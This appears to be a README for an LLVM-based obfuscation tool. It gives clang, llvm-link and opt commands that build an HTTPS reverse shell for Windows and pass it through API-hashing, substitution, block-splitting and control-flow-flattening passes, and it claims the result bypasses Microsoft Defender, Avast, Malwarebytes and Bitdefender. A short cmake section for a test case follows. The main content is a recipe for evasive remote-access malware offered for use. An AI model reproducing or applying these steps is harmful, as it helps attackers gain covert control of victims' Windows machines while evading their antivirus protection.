# Build https reverse shell for Windows

This RS is currently bypassing:
* Microsoft Defender
* Avast
* Malwarebytes
* Bitdefender Free, if using httpsRS.c (a little bit buggy the RS interface)

```bash
../../llvm-project/build/bin/clang -O0 -Xclang -disable-O0-optnone -Wimplicit-function-declaration -emit-llvm -S httpsRS.c -o httpsRS.ll -I/usr/x86_64-w64-mingw32/include --target=x86_64-w64-windows-gnu
../../llvm-project/build/bin/clang -O0 -Xclang -disable-O0-optnone -emit-llvm -S WindowsTools/APIResolver.c -o WindowsTools/APIResolver.ll -I/usr/x86_64-w64-mingw32/include --target=x86_64-w64-windows-gnu
../../llvm-project/build/bin/llvm-link WindowsTools/APIResolver.ll httpsRS.ll -S -o hack.ll
../../llvm-project/build/bin/opt -load-pass-plugin "../build/ObfuscationPlugin.so" -passes="api_hashing,sub,splitbb,fla" -os windows -sub_loop=2 -split_num=2 -S "hack.ll" -o "out.ll"
../../llvm-project/build/bin/clang out.ll --target=x86_64-w64-windows-gnu 
```

# Automated build for a test case (test.c)
```bash
cd build_test
cmake ..
cmake --build .
cmake --build . --target run_test
```
